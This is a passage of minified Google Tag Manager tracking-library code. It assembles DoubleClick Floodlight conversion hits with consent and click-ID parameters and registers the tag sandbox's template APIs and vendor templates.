          "gtm.timerElapsedTime": b - a.Ue,
          "gtm.triggers": a.Qh
        });
      }
    };
  }
  function pC(a, b) {
    return b;
  }
  pC.F = "internal.enableAutoEventOnTimer";
  var yc = da(["data-gtm-yt-inspected-"]),
    qC = ["www.youtube.com", "www.youtube-nocookie.com"],
    rC,
    sC = !1;
  function CC(a, b) {
    var c = this;
    return b;
  }
  window.addEventListener("beforeunload", initTracking);
  CC.F = "internal.enableAutoEventOnYouTubeActivity";
  var DC;
  function EC(a) {
    var b = !1;
    return b;
  }
  EC.F = "internal.evaluateMatchingRules";
  var IC = function (a) {
      var b = a.h[Q.g.ba];
      if (!Array.isArray(b)) return "";
      for (var c = [], d = function (k, m, n) {
          void 0 !== n && "" !== n && c.push(k + m + ":" + encodeURIComponent(String(n)));
        }, e = 0; e < b.length; e++) {
        var f = b[e],
          g = e + 1;
        d("i", g, f.id);
        d("p", g, f.price);
        d("q", g, f[Q.g.Zc]);
        d("c", g, f[Q.g.sc]);
        d("l", g, f[Q.g.Ka]);
        d("a", g, f.accountId);
      }
      return c.join("|");
    },
    JC = {},
    KC = (JC[Q.g.vd] = "gcu", JC[Q.g.rb] = "gclaw", JC[Q.g.Hb] = "auiddc", JC[Q.g.Jb] = "ps", JC[Q.g.ri] = "gcldc", JC[Q.g.ub] = "edid", JC[Q.g.yi] = "cat", JC[Q.g.zi] = "type", JC[Q.g.vg] = "src", JC[Q.g.Ai] = "pcor", JC[Q.g.Bi] = "num", JC[Q.g.Ci] = "tran", JC[Q.g.Di] = "u", JC[Q.g.Pd] = "gac", JC[Q.g.uc] = "gacgb", JC[Q.g.Qd] = "gdpr", JC[Q.g.wb] = "gdid", JC[Q.g.Sd] = "gtm_up", JC[Q.g.Zc] = "qty", JC[Q.g.Xd] = "gdpr_consent", JC[Q.g.ya] = "ord", JC[Q.g.ja] = "cost", JC[Q.g.wc] = "gclgb", JC[Q.g.yc] = "npa", JC[Q.g.Ba] = null, JC[Q.g.Rc] = null, JC[Q.g.ba] = null, JC[Q.g.Yd] = null, JC[Q.g.Zd] = null, JC[Q.g.ae] = null, JC[Q.g.be] = null, JC[Q.g.ce] = null, JC[Q.g.de] = null, JC[Q.g.ee] = null, JC[Q.g.fe] = null, JC),
    LC = function (a, b) {
      var c = [],
        d = {},
        e = function (t, u, v) {
          var w = v ? String(u) : encodeURIComponent(String(u));
          d[t] = w;
        },
        f = nb(a.h[Q.g.Rc]) ? a.h[Q.g.Rc] : {};
      l(a.h, function (t, u) {
        var v = KC[t];
        if (v) {
          if (void 0 === u || "" === u) return;
          e(v, u);
        }
        void 0 === v && e(t, u);
      });
      e("gtm", hn(Dp(a)));
      pm() && e("gcs", qm());
      S(37) && e("gcd", um(a.s));
      S(39) && (ym() && e("dma_cps", vm()), e("dma", xm()));
      S(62) && Ql(Zl()) && e("tcfd", zm());
      var g = IC(a);
      g && e("prd", g, !0);
      var k = function (t, u) {
        var v = a.h[t];
        void 0 !== v && e(u, v);
      };
      k(Q.g.Yd, "uaa");
      k(Q.g.Zd, "uab");
      k(Q.g.ae, "uafvl");
      k(Q.g.be, "uamb");
      k(Q.g.ce, "uam");
      k(Q.g.de, "uap");
      k(Q.g.ee, "uapv");
      k(Q.g.fe, "uaw");
      e("epver", "2");
      var m = a.h[Q.g.Ba];
      m && a.metadata.redact_click_ids && (m = In(String(m)));
      l(f, function (t, u) {
        null != u && ("~oref" === t ? m = u : e(encodeURIComponent(t), u));
      });
      var n = !S(61) || ak(Q.g.O),
        p = a.metadata.user_data;
      if (p && n) {
        var q = Xh(p);
        q && c.push(q.then(function (t) {
          return e("em", t.Dj);
        }));
      }
      var r = function () {
        m && e("~oref", m);
        b(d);
      };
      if (c.length) try {
        Promise.all(c).then(function () {
          r();
        });
        return;
      } catch (t) {}
      r();
    },
    MC = function (a) {
      LC(a, function (b) {
        var c = a.metadata.parsed_target,
          d = a.metadata.send_as_iframe,
          e = a.h[Q.g.vg],
          f = a.metadata.consent_ad_storage,
          g = !S(61) || ak(Q.g.O),
          k = f && g ? d ? "https://" + e + ".fls.doubleclick.net/activityi;" : "https://ad.doubleclick.net/activity;" : "https://ade.googlesyndication.com/ddm/activity/",
          m = [];
        l(b, function (q, r) {
          m.push(q + "=" + r);
        });
        var n = k + m.join(";") + "?";
        d ? Mc(n, a.s.onSuccess) : Nc(n, a.s.onSuccess, a.s.onFailure);
        a.metadata.attribution_reporting_experiment && (S(57) ? Nc("https://ad.doubleclick.net/activity;register_conversion=1;" + m.join(";") + "?", void 0, void 0, {
          attributionsrc: ""
        }) : Wc("https://ad.doubleclick.net/activity;register_conversion=1;" + m.join(";") + "?"));
        if (a.metadata.send_fledge_experiment) {
          var p = ls() + "/td/fls/rul/activityi;fledge=1;" + m.join(";") + "?";
          ks(p, c.target.id);
        }
      });
    };
  var NC = function () {
      return S(61) ? [Q.g.K, Q.g.O] : [Q.g.K];
    },
    PC = function () {
      if (!OC && !hs(gs())) {
        if (!Gl('AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9')) return !1;
        OC = !0;
      }
      if (hs(gs())) return !0;
      return !1;
    },
    RC = function (a) {
      var b = jp(a);
      if (b && (1 === b.R.length || 3 === b.R.length)) {
        var c = b.R[1] || "",
          d = b.R[2],
          e = "",
          f = "unknown";
        if (d) {
          var g = d.split("+");
          if (2 !== g.length) return;
          e = g[0];
          f = QC[g[1].toLowerCase()];
        }
        if (f) return {
          target: b,
          Zk: c,
          al: e,
          ql: f
        };
      }
    },
    SC = function (a) {
      var b = V(a.s, Q.g.vi);
      if (nb(b) && b.exclusion_parameters && b.engines) if (Xm()) {} else {
        var c = a.metadata.conversion_linker_enabled,
          d = a.metadata.cookie_options,
          e = function () {
            var f = {
              config: b,
              gtm: hn(Dp(a))
            };
            c && (ro(d), f.auiddc = lo[no(d.prefix)]);
            void 0 === z.__dc_ns_processor && (z.__dc_ns_processor = []);
            z.__dc_ns_processor.push(f);
            Kc("https://www.googletagmanager.com/dclk/ns/v1.js");
          };
        a.metadata.consent_ad_storage ? e() : Rj(e, Q.g.K);
      }
    },
    UC = function (a, b, c, d) {
      function e() {
        for (var m = 0; m < TC.length && (TC[m](g), !g.isAborted); ++m);
        g.metadata.speculative || g.isAborted || MC(g);
      }
      var f = RC(a);
      if (f) {
        var g = new Cp(f.target, b, d);
        g.metadata.parsed_target = f;
        g.metadata.counting_method = f.ql;
        var k = NC();
        dk(function () {
          e();
          g.isAborted ? J(g.s.onSuccess) : ak(k) || ck(function (m) {
            var n = m.consentEventId,
              p = m.consentPriorityId;
            ak(k) && (g.metadata.consent_updated = !0, e(n, p));
          }, k);
        }, k);
      } else J(d.onFailure);
    },
    TC = [Hq, function (a) {
      a.metadata.conversion_linker_enabled = !1 !== V(a.s, Q.g.Ha);
      var b = !0 === V(a.s, Q.g.Ye),
        c = ak(Q.g.K);
      if (Xm() && b) {
        b = !1;
      }
      a.metadata.send_as_iframe = b && c;
      var d = V(a.s, Q.g.wa);
      a.metadata.redact_ads_data = void 0 != d && !1 !== d;
      a.metadata.redact_click_ids = a.metadata.redact_ads_data && !ak(NC());
      var e = {
        prefix: V(a.s, Q.g.Pa) || V(a.s, Q.g.Qa),
        domain: V(a.s, Q.g.Wa),
        Yb: V(a.s, Q.g.Ja),
        flags: V(a.s, Q.g.Xa)
      };
      a.metadata.cookie_options = e;
      a.metadata.consent_ad_storage = c;
    }, function (a) {
      if (!a.metadata.consent_updated) {
        var b = a.s.isGtmEvent ? V(a.s, "oref") : Gn(Hn(z.location.href));
        a.h[Q.g.Ba] = b;
      }
    }, function (a) {
      if (a.eventName === Q.g.Oa && !a.s.isGtmEvent) {
        if (!a.metadata.consent_updated) {
          var b = {
            callback: V(a.s, Q.g.vb),
            Cj: V(a.s, V(a.s, Q.g.ib)),
            Wj: V(a.s, Q.g.ib)
          };
          Gq(b, a.metadata.cookie_options, a.metadata.redact_ads_data, zq);
        }
        a.isAborted = !0;
      }
    }, function (a) {
      if (a.eventName === Q.g.sa && !a.s.isGtmEvent) if (a.metadata.consent_updated) a.isAborted = !0;else {
        var b = a.metadata.conversion_linker_enabled,
          c = a.metadata.cookie_options,
          d = a.metadata.redact_ads_data;
        Fq({
          pj: b,
          pl: V(a.s, Q.g.tb),
          Bj: V(a.s, Q.g.La) || {},
          Tj: V(a.s, Q.g.Bb),
          Xf: Dp(a),
          mj: om(a.s)
        }, c);
        SC(a);
        var e = a.metadata.parsed_target.target,
          f = cb(el(a.s, Q.g.da, 2), "."),
          g = cb(el(a.s, Q.g.da, 1), ".");
        gp({
          fh: !0,
          gd: b ? c : void 0,
          kh: f,
          s: a.s,
          oh: g,
          Nf: b,
          Uf: d,
          targetId: 1 < e.R.length ? e.id : ""
        });
        a.isAborted = !0;
        J(a.s.onSuccess);
      }
    }, function (a) {
      var b = a.metadata.parsed_target,
        c = {},
        d = V(a.s, Q.g.Rc);
      nb(d) && l(d, function (e, f) {
        null != f && (c[e] = f);
      });
      a.h[Q.g.vg] = b.target.R[0];
      a.h[Q.g.zi] = b.Zk;
      a.h[Q.g.yi] = b.al;
      a.h[Q.g.Rc] = c;
    }, function (a) {
      var b = a.metadata.counting_method;
      switch (b) {
        case "standard":
          a.h[Q.g.ya] = Ka(1E11, 1E13);
          return;
        case "unique":
          a.h[Q.g.ya] = "1";
          a.h[Q.g.Bi] = Ka(1E11, 1E13);
          return;
        case "per_session":
          var c = V(a.s, Q.g.Ab);
          a.h[Q.g.ya] = c;
          return;
      }
      var d = "transactions" === b ? "1" : V(a.s, Q.g.Zc);
      a.h[Q.g.Zc] = d;
      a.copyToHitData(Q.g.ja);
      a.copyToHitData(Q.g.ya);
    }, function (a) {
      a.s.isGtmEvent && (a.copyToHitData(Q.g.Di), a.copyToHitData(Q.g.Ci));
    }, function (a) {
      a.metadata.consent_updated && (a.h[Q.g.vd] = "1");
    }, function (a) {
      var b = hm();
      b && (a.h[Q.g.Qd] = b);
      var c = gm();
      c && (a.h[Q.g.Xd] = c);
    }, function (a) {
      "1" === Zn(!1)._up && (a.h[Q.g.Sd] = "1");
    }, function (a) {
      om(a.s) ? S(41) && (a.h[Q.g.yc] = "0") : a.h[Q.g.yc] = "1";
    }, function (a) {
      if (a.metadata.conversion_linker_enabled) {
        var b = !S(61) || ak(Q.g.O),
          c = a.metadata.cookie_options,
          d = a.metadata.redact_ads_data,
          e = zq(c.prefix, d),
          f = !1;
        ro(c);
        var g = b ? lo[no(c.prefix)] : void 0;
        e && e.length && (a.h[Q.g.ri] = e.join("."), f = !0);
        if (a.metadata.send_as_iframe) {
          var k = "_gcl" !== Ko(c.prefix);
          if (f || !Dq(c.prefix)) {
            var m = yq(c.prefix, d);
            m && m.length && (a.h[Q.g.rb] = m.join("."), O(59));
            var n = Aq(d);
            n && (k || (a.h[Q.g.Pd] = n));
          } else {
            var p = uq("gb", c.prefix, d);
            p.length && (a.h[Q.g.wc] = p.join("."));
            if (!k) {
              var q = Bq(d);
              q && (a.h[Q.g.uc] = q);
            }
          }
        }
        g && (a.h[Q.g.Hb] = g);
      }
    }, function (a) {
      var b = a.metadata.counting_method;
      if ("transactions" === b || "items_sold" === b) {
        var c = a.s.isGtmEvent,
          d = V(a.s, Q.g.ba);
        if (Ha(d)) {
          for (var e = 0; e < d.length; e++) {
            var f = d[e];
            nb(f) && !c && (f[Q.g.sc] = V(a.s, Q.g.sc), f[Q.g.Ka] = V(a.s, Q.g.Ka), f.accountId = void 0);
          }
          a.h[Q.g.ba] = d;
        }
      }
    }, function (a) {
      var b = V(a.s, Q.g.Qc),
        c = {};
      nb(b) && l(b, function (g, k) {
        h(k) && VC.test(g) && (c[g] = k);
      });
      for (var d = dl(a.s), e = 0; e < d.length; e++) {
        var f = d[e];
        VC.test(f) && (c[f] = f);
      }
      l(c, function (g, k) {
        a.h[g] = V(a.s, k);
      });
    }, function (a) {
      var b = cb(el(a.s, Q.g.da, 1), "."),
        c = cb(el(a.s, Q.g.da, 2), ".");
      a.h[Q.g.wb] = b;
      a.h[Q.g.ub] = c;
    }, function (a) {
      var b = ak(NC()) && PC();
      if (a.metadata.attribution_reporting_experiment = b) a.h[Q.g.Jb] = "1", a.h[Q.g.Ai] = Ka();
    }, function (a) {
      if (a.s.isGtmEvent) {
        var b = V(a.s, Q.g.Ca);
        nb(b) && (a.metadata.user_data = b);
      }
    }, function (a) {
      if (S(19)) if (!tn(z)) O(87);else if (void 0 !== vn) {
        O(85);
        var b = rn();
        b ? zn(b, a) : O(86);
      }
    }, function (a) {
      S(11) && ak(NC()) && !1 !== V(a.s, Q.g.Ga) && om(a.s) && js() && (a.metadata.send_fledge_experiment = !0);
    }, function (a) {
      if (Ep(a, "ccd_add_1p_data", !1) && (!S(61) || ak(Q.g.O))) {
        var b = a.s.C[Q.g.ie];
        if (Wi(b)) {
          var c = V(a.s, Q.g.Ca);
          null === c ? a.metadata.user_data_from_code = null : (b.enable_code && nb(c) && (a.metadata.user_data_from_code = c), nb(b.selectors) && (a.metadata.user_data_from_manual = Vi(b.selectors)));
        }
      }
    }, function (a) {
      Hp(a);
    }],
    QC = {
      "": "unknown",
      standard: "standard",
      unique: "unique",
      per_session: "per_session",
      transactions: "transactions",
      items_sold: "items_sold"
    },
    VC = /^u([1-9]\d?|100)$/,
    OC = !1;
  var iD = function () {
      var a = !0;
      im(7) && im(9) && im(10) || (a = !1);
      return a;
    },
    jD = function () {
      var a = !0;
      im(3) && im(4) || (a = !1);
      return a;
    };
  function eE(a, b, c, d) {}
  eE.F = "internal.executeEventProcessor";
  function fE(a) {
    var b = void 0;
    return md(b, this.h, 1);
  }
  fE.F = "internal.executeJavascriptString";
  var gE = function (a) {
    var b;
    return b;
  };
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'DC-12992475'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  hE.P = "getContainerVersion";
  function iE(a, b) {
    b = void 0 === b ? !0 : b;
    var c;
    return c;
  }
  iE.P = "getCookieValues";
  function jE() {
    return mj();
  }
  jE.F = "internal.getCountryCode";
  function kE() {
    var a = [];
    return md(a);
  }
  kE.F = "internal.getDestinationIds";
  function lE(a, b) {
    var c = "";
    return c;
  }
  lE.F = "internal.getElementAttribute";
  function mE(a) {
    var b = null;
    return b;
  }
  mE.F = "internal.getElementById";
  function nE(a) {
    var b = "";
    return b;
  }
  nE.F = "internal.getElementInnerText";
  function oE(a, b) {
    var c = null;
    return c;
  }
  oE.F = "internal.getElementProperty";
  function pE(a) {
    var b;
    return b;
  }
  pE.F = "internal.getElementValue";
  function qE(a) {
    var b = 0;
    return b;
  }
  qE.F = "internal.getElementVisibilityRatio";
  function rE(a) {
    var b = null;
    return b;
  }
  rE.F = "internal.getElementsByCssSelector";
  function sE(a) {
    var b = void 0;
    return b;
  }
  sE.F = "internal.getEventData";
  var tE = {};
  tE.enableAWFledge = S(6);
  tE.enableAdsConversionValidation = S(30);
  tE.enableAdsHistoryChangeEvents = S(14);
  tE.enableAutoPiiOnPhoneAndAddress = S(42);
  tE.enableCcdPreAutoPiiDetection = S(17);
  tE.enableCloudRecommentationsErrorLogging = S(88);
  tE.enableCloudRecommentationsSchemaIngestion = S(87);
  tE.enableCloudRetailInjectPurchaseMetadata = S(86);
  tE.enableCloudRetailLogging = S(85);
  tE.enableCloudRetailPageCategories = S(25);
  tE.enableConsentDisclosureActivity = S(47);
  tE.enableDecodeUri = S(68);
  tE.enableDeferAllEnhancedMeasurement = S(49);
  tE.enableDirectTagLoadingInGoogleTag = S(79);
  tE.enableDmaConsentActivities = S(95);
  tE.enableEuidAutoMode = S(15);
  tE.enableFormSkipValidation = S(43);
  tE.enableLoadGoogleTagOptionsObject = S(83);
  tE.enableUrlDecodeEventUsage = S(60);
  tE.enableV1HistoryEventInApi = S(94);
  tE.loadContainerForGtmEventTags = S(46);
  tE.useEnableAutoEventOnFormApis = S(32);
  tE.autoPiiEligible = qj();
  function uE() {
    return md(tE);
  }
  uE.F = "internal.getFlags";
  function vE() {
    return new jd(ry);
  }
  vE.F = "internal.getHtmlId";
  function wE(a, b) {
    var c;
    return c;
  }
  wE.F = "internal.getProductSettingsParameter";
  function xE(a, b) {
    var c;
    return c;
  }
  xE.P = "getQueryParameters";
  function yE(a, b) {
    var c;
    return c;
  }
  yE.P = "getReferrerQueryParameters";
  function zE(a) {
    var b = "";
    return b;
  }
  zE.P = "getReferrerUrl";
  function AE() {
    return nj();
  }
  AE.F = "internal.getRegionCode";
  function BE(a, b) {
    var c;
    return c;
  }
  BE.F = "internal.getRemoteConfigParameter";
  function CE(a) {
    var b = "";
    return b;
  }
  CE.P = "getUrl";
  function DE() {
    N(this, "get_user_agent");
    return Dc.userAgent;
  }
  DE.P = "getUserAgent";
  function OE() {
    return z.gaGlobal = z.gaGlobal || {};
  }
  var PE = function () {
      var a = OE();
      a.hid = a.hid || Ka();
      return a.hid;
    },
    QE = function (a, b) {
      var c = OE();
      if (void 0 == c.vid || b && !c.from_cookie) c.vid = a, c.from_cookie = b;
    };
  var xF = function (a) {
      this.C = a;
      this.D = "";
      this.h = this.C;
    },
    yF = function (a, b) {
      a.h = b;
      return a;
    };
  function zF(a) {
    var b = a.search;
    return a.protocol + "//" + a.hostname + a.pathname + (b ? b + "&richsstsse" : "?richsstsse");
  }
  function AF(a, b) {
    var c = a || [];
    if (Array.isArray(c)) for (var d = 0; d < c.length; d++) b(c[d]);
  }
  ;
  var PF = window,
    QF = document,
    RF = function (a) {
      var b = PF._gaUserPrefs;
      if (b && b.ioo && b.ioo() || QF.documentElement.hasAttribute("data-google-analytics-opt-out") || a && !0 === PF["ga-disable-" + a]) return !0;
      try {
        var c = PF.external;
        if (c && c._gaUserPrefs && "oo" == c._gaUserPrefs) return !0;
      } catch (f) {}
      for (var d = Am("AMP_TOKEN", String(QF.cookie), !0), e = 0; e < d.length; e++) if ("$OPT_OUT" == d[e]) return !0;
      return QF.getElementById("__gaOptOutExtension") ? !0 : !1;
    };
  function $F(a) {
    l(a, function (c) {
      "_" === c.charAt(0) && delete a[c];
    });
    var b = a[Q.g.Ya] || {};
    l(b, function (c) {
      "_" === c.charAt(0) && delete b[c];
    });
  }
  ;
  var hG = function (a, b) {};
  function gG(a, b) {
    var c = function () {};
    return c;
  }
  function iG(a, b, c) {}
  ;
  var jG = gG;
  function lG(a, b, c) {
    var d = this;
  }
  lG.F = "internal.gtagConfig";
  function mG() {
    var a = {};
    return a;
  }
  ;
  function oG(a, b) {}
  oG.P = "gtagSet";
  function pG(a, b) {}
  pG.P = "injectHiddenIframe";
  function qG(a, b, c, d, e) {}
  qG.F = "internal.injectHtml";
  var uG = {};
  function wG(a, b, c, d) {}
  var xG = Object.freeze({
      dl: 1,
      id: 1
    }),
    yG = {};
  function zG(a, b, c, d) {}
  wG.P = "injectScript";
  zG.F = "internal.injectScript";
  function AG(a) {
    var b = !0;
    return b;
  }
  AG.P = "isConsentGranted";
  var BG = function () {
    var a = jh(function (b) {
      this.h.h.log("error", b);
    });
    a.P = "JSON";
    return a;
  };
  function CG(a) {
    var b = void 0;
    return md(b);
  }
  CG.F = "internal.legacyParseUrl";
  var DG = function () {
      return !1;
    },
    EG = {
      getItem: function (a) {
        var b = null;
        return b;
      },
      setItem: function (a, b) {
        return !1;
      },
      removeItem: function (a) {}
    };
  function FG() {}
  FG.P = "logToConsole";
  function GG(a, b) {}
  GG.F = "internal.mergeRemoteConfig";
  function HG(a, b, c) {
    c = void 0 === c ? !0 : c;
    var d = [];
    return d;
  }
  HG.F = "internal.parseCookieValuesFromString";
  function IG(a) {
    var b = void 0;
    return b;
  }
  IG.P = "parseUrl";
  function JG(a) {}
  JG.F = "internal.processAsNewEvent";
  function KG(a, b, c) {
    var d;
    return d;
  }
  KG.F = "internal.pushToDataLayer";
  function LG(a, b) {
    var c = !1;
    return c;
  }
  LG.P = "queryPermission";
  function MG() {
    var a = "";
    return a;
  }
  MG.P = "readCharacterSet";
  function NG() {
    return ni.ia;
  }
  NG.F = "internal.readDataLayerName";
  function OG() {
    var a = "";
    return a;
  }
  OG.P = "readTitle";
  function PG(a, b) {
    var c = this;
  }
  PG.F = "internal.registerCcdCallback";
  function QG(a) {
    return !0;
  }
  QG.F = "internal.registerDestination";
  var RG = Object.freeze(["config", "event", "get", "set"]);
  function SG(a, b, c) {}
  SG.F = "internal.registerGtagCommandListener";
  function TG(a, b) {
    var c = !1;
    return c;
  }
  TG.F = "internal.removeDataLayerEventListener";
  function UG(a, b) {}
  UG.F = "internal.removeFormData";
  function VG() {}
  VG.P = "resetDataLayer";
  function WG(a, b, c, d) {}
  WG.F = "internal.sendGtagEvent";
  function XG(a, b, c) {}
  XG.P = "sendPixel";
  function YG(a, b) {}
  YG.F = "internal.setAnchorHref";
  function ZG(a, b, c, d) {
    var e = this;
    d = void 0 === d ? !0 : d;
    var f = !1;
    return f;
  }
  ZG.P = "setCookie";
  function $G(a, b) {}
  $G.F = "internal.setCorePlatformServices";
  function aH(a) {}
  aH.P = "setDefaultConsentState";
  function bH(a, b) {}
  bH.F = "internal.setDelegatedConsentType";
  function cH(a, b) {}
  cH.F = "internal.setFormAction";
  function dH(a, b, c) {
    return !1;
  }
  dH.P = "setInWindow";
  function eH(a, b, c) {}
  eH.F = "internal.setProductSettingsParameter";
  function fH(a, b, c) {}
  fH.F = "internal.setRemoteConfigParameter";
  function gH(a, b, c, d) {
    var e = this;
  }
  gH.P = "sha256";
  function hH(a, b, c) {}
  hH.F = "internal.sortRemoteConfigParameters";
  var iH = {},
    jH = {};
  iH.P = "templateStorage";
  iH.getItem = function (a) {
    var b = null;
    return b;
  };
  iH.setItem = function (a, b) {};
  iH.removeItem = function (a) {};
  iH.clear = function () {};
  function kH(a, b) {
    var c = !1;
    return c;
  }
  kH.F = "internal.testRegex";
  var lH = function (a) {
    var b;
    return b;
  };
  function mH(a) {}
  mH.P = "updateConsentState";
  var nH;
  function oH(a, b, c) {
    nH = nH || new th();
    nH.add(a, b, c);
  }
  function pH(a, b) {
    var c = nH = nH || new th();
    if (c.C.hasOwnProperty(a)) throw "Attempting to add a private function which already exists: " + a + ".";
    if (c.h.hasOwnProperty(a)) throw "Attempting to add a private function with an existing API name: " + a + ".";
    c.C[a] = Ea(b) ? Mg(a, b) : Ng(a, b);
  }
  function qH() {
    return function (a) {
      var b;
      var c = nH;
      if (c.h.hasOwnProperty(a)) b = c.get(a, this);else {
        var d;
        if (d = c.C.hasOwnProperty(a)) {
          var e = !1,
            f = this.h.h;
          if (f) {
            var g = f.hd();
            if (g) {
              0 !== g.indexOf("__cvt_") && (e = !0);
            }
          } else e = !0;
          d = e;
        }
        if (d) {
          var k = c.C.hasOwnProperty(a) ? c.C[a] : void 0;
          b = k;
        } else throw Error(a + " is not a valid API name.");
      }
      return b;
    };
  }
  ;
  var rH = function () {
    var a = function (c) {
        return pH(c.F, c);
      },
      b = function (c) {
        return oH(c.P, c);
      };
    b(Tz);
    b(Zz);
    b(PA);
    b(SA);
    b(TA);
    b(XA);
    b(ZA);
    b(bB);
    b(BG());
    b(dB);
    b(hE);
    b(iE);
    b(xE);
    b(yE);
    b(zE);
    b(CE);
    b(oG);
    b(pG);
    b(wG);
    b(AG);
    b(FG);
    b(IG);
    b(LG);
    b(MG);
    b(OG);
    b(XG);
    b(ZG);
    b(aH);
    b(dH);
    b(gH);
    b(iH);
    b(mH);
    oH("Math", Sg());
    oH("Object", rh);
    oH("TestHelper", vh());
    oH("assertApi", Og);
    oH("assertThat", Pg);
    oH("decodeUri", Tg);
    oH("decodeUriComponent", Ug);
    oH("encodeUri", Zg);
    oH("encodeUriComponent", $g);
    oH("fail", fh);
    oH("generateRandom", gh);
    oH("getTimestamp", hh);
    oH("getTimestampMillis", hh);
    oH("getType", ih);
    oH("makeInteger", kh);
    oH("makeNumber", lh);
    oH("makeString", mh);
    oH("makeTableMap", nh);
    oH("mock", qh);
    oH("fromBase64", gE, !("atob" in z));
    oH("localStorage", EG, !DG());
    oH("toBase64", lH, !("btoa" in z));
    a(Wz);
    a(dA);
    a(pA);
    a(wA);
    a(BA);
    a(EA);
    a(NA);
    a(QA);
    a(UA);
    a(VA);
    a(YA);
    a($A);
    a(aB);
    a(cB);
    a(eB);
    a(hB);
    a(iB);
    a(kB);
    a(oB);
    a(tB);
    a(uB);
    a(FB);
    a(KB);
    a(PB);
    a(YB);
    a(cC);
    a(nC);
    a(pC);
    a(CC);
    a(ah);
    a(EC);
    a(eE);
    a(fE);
    a(jE);
    a(kE);
    a(lE);
    a(mE);
    a(nE);
    a(oE);
    a(pE);
    a(qE);
    a(rE);
    a(sE);
    a(uE);
    a(vE);
    a(wE);
    a(AE);
    a(BE);
    a(lG);
    a(zG);
    a(CG);
    a(DA);
    a(GG);
    a(HG);
    a(JG);
    a(KG);
    a(NG);
    a(PG);
    a(QG);
    a(SG);
    a(TG);
    a(UG);
    a(WG);
    a(YG);
    a($G);
    a(bH);
    a(cH);
    a(eH);
    a(fH);
    a(hH);
    a(kH);
    pH("internal.GtagSchema", mG());
    S(71) && a(qG);
    S(101) && a(jB);
    return qH();
  };
  var Rz;
  function sH() {
    Rz.h.h.N = function (a, b, c) {
      oi.SANDBOXED_JS_SEMAPHORE = oi.SANDBOXED_JS_SEMAPHORE || 0;
      oi.SANDBOXED_JS_SEMAPHORE++;
      try {
        return a.apply(b, c);
      } finally {
        oi.SANDBOXED_JS_SEMAPHORE--;
      }
    };
  }
  function tH(a) {
    void 0 !== a && l(a, function (b, c) {
      for (var d = 0; d < c.length; d++) {
        var e = c[d].replace(/^_*/, "");
        Gi[e] = Gi[e] || [];
        Gi[e].push(b);
      }
    });
  }
  ;
  var uH = encodeURI,
    Y = encodeURIComponent,
    vH = function (a, b, c) {
      Nc(a, b, c);
    },
    wH = function (a, b) {
      if (!a) return !1;
      var c = Fn(Hn(a), "host");
      if (!c) return !1;
      for (var d = 0; b && d < b.length; d++) {
        var e = b[d] && b[d].toLowerCase();
        if (e) {
          var f = c.length - e.length;
          0 < f && "." != e.charAt(0) && (f--, e = "." + e);
          if (0 <= f && c.indexOf(e, f) == f) return !0;
        }
      }
      return !1;
    },
    xH = function (a, b, c) {
      for (var d = {}, e = !1, f = 0; a && f < a.length; f++) a[f] && a[f].hasOwnProperty(b) && a[f].hasOwnProperty(c) && (d[a[f][b]] = a[f][c], e = !0);
      return e ? d : null;
    };
  var Z = {
    m: {}
  };
  Z.m.e = ["google"], function () {
    (function (a) {
      Z.__e = a;
      Z.__e.o = "e";
      Z.__e.isVendorTemplate = !0;
      Z.__e.priorityOverride = 0;
      Z.__e.isInfrastructure = !1;
      Z.__e.runInSiloedMode = !0;
    })(function (a) {
      return String(a.vtp_gtmCachedValues.event);
    });
  }();
  Z.m.v = ["google"], function () {
    (function (a) {
      Z.__v = a;
      Z.__v.o = "v";
      Z.__v.isVendorTemplate = !0;
      Z.__v.priorityOverride = 0;
      Z.__v.isInfrastructure = !1;
      Z.__v.runInSiloedMode = !1;
    })(function (a) {
      var b = a.vtp_name;
      if (!b || !b.replace) return !1;
      var c = fz(b.replace(/\\\./g, "."), a.vtp_dataLayerVersion || 1),
        d = void 0 !== c ? c : a.vtp_defaultValue;
      nz(d, "v", a.vtp_gtmEventId);
      return d;
    });
  }();
  Z.m.rep = ["google"], function () {
    (function (a) {
      Z.__rep = a;
      Z.__rep.o = "rep";
      Z.__rep.isVendorTemplate = !0;
      Z.__rep.priorityOverride = 0;
      Z.__rep.isInfrastructure = !1;
      Z.__rep.runInSiloedMode = !0;
    })(function (a) {
      var b = wk(a.vtp_containerId),
        c = jp(b, !0),
        d;
      switch (c.prefix) {
        case "AW":
          d = HC;
          break;
        case "DC":
          d = UC;
          break;
        case "GF":
          d = $C;
          break;
        case "HA":
          d = eD;
          break;
        case "UA":
          d = DD;
          break;
        case "MC":
          d = jG(c, a.vtp_gtmEventId);
          break;
        default:
          J(a.vtp_gtmOnFailure);
          return;
      }
      d ? (J(a.vtp_gtmOnSuccess), eq(b, d), a.vtp_remoteConfig && jq(b, a.vtp_remoteConfig || {})) : J(a.vtp_gtmOnFailure);
    });
  }();
  Z.m.read_container_data = ["google"], function () {
    (function (a) {
      Z.__read_container_data = a;
      Z.__read_container_data.o = "read_container_data";
      Z.__read_container_data.isVendorTemplate = !0;
      Z.__read_container_data.priorityOverride = 0;
      Z.__read_container_data.isInfrastructure = !1;
      Z.__read_container_data.runInSiloedMode = !1;
    })(function () {
      return {
        assert: function () {},
        M: function () {
          return {};
        }
      };
    });
  }();
  Z.m.get = ["google"], function () {
    (function (a) {
      Z.__get = a;
      Z.__get.o = "get";
      Z.__get.isVendorTemplate = !0;
      Z.__get.priorityOverride = 0;
      Z.__get.isInfrastructure = !1;
      Z.__get.runInSiloedMode = !1;
    })(function (a) {
      var b = a.vtp_settings,
        c = b.eventParameters || {},
        d = String(a.vtp_eventName),
        e = {};
      e.eventId = a.vtp_gtmEventId;
      e.priorityId = a.vtp_gtmPriorityId;
      a.vtp_deferrable && (e.deferrable = !0);
      var f = Sv(String(b.streamId), d, c);
      ow(f, e.eventId, e);
      a.vtp_gtmOnSuccess();
    });
  }();
  var TI = {};
